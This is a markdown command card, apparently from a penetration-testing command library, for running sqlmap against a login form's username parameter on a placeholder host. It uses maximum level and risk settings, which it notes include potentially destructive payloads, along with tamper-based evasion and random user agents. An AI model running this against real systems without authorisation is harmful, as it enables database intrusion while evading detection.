---
id: cmd-uuid-2
data: >-
  python3 sqlmap.py --level=5 --risk=3 --tamper=space2comment --random-agent -u
  https://target.com/olc/setlogin.php --data="username=admin&password=pass" -p
  username --dbms=mysql
tags:
  - sqli
  - sqlmap
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.020Z'
verified: false
validated: true
submitted: true
---
# sqlmap-verify-injection

## Command

```bash
python3 sqlmap.py --level=5 --risk=3 --tamper=space2comment --random-agent -u https://target.com/olc/setlogin.php --data="username=admin&password=pass" -p username --dbms=mysql
```

## Description

This command runs sqlmap to detect and confirm SQL injection types in the specified POST parameter, using evasion techniques to avoid detection during testing of a web login endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--level=5` | Highest testing thoroughness | Yes |
| `--risk=3` | Includes potentially destructive payloads | Yes |
| `--tamper=space2comment` | Replaces spaces with comments for evasion | Yes |
| `--random-agent` | Rotates User-Agent headers | Yes |
| `-u` | Target URL | Yes |
| `--data` | POST data string | Yes |
| `-p username` | Test specific parameter | Yes |
| `--dbms=mysql` | Assume MySQL backend | Yes |

## Examples

### Basic Usage

```bash
python3 sqlmap.py --level=5 --risk=3 --tamper=space2comment --random-agent -u https://target.com/olc/setlogin.php --data="username=admin&password=pass" -p username --dbms=mysql
```

### Advanced Usage

```bash
python3 sqlmap.py --level=5 --risk=3 --tamper=space2comment --random-agent -u https://target.com/olc/setlogin.php --data="username=admin&password=pass" -p username --dbms=mysql --batch
```

## Expected Output

Report identifying boolean-based blind and time-based blind injections, MySQL version (e.g., >=5.0.12), and backend web server (Apache).

## Related

- [[Related Procedure: Automated-SQLi-Confirmation-with-sqlmap]]
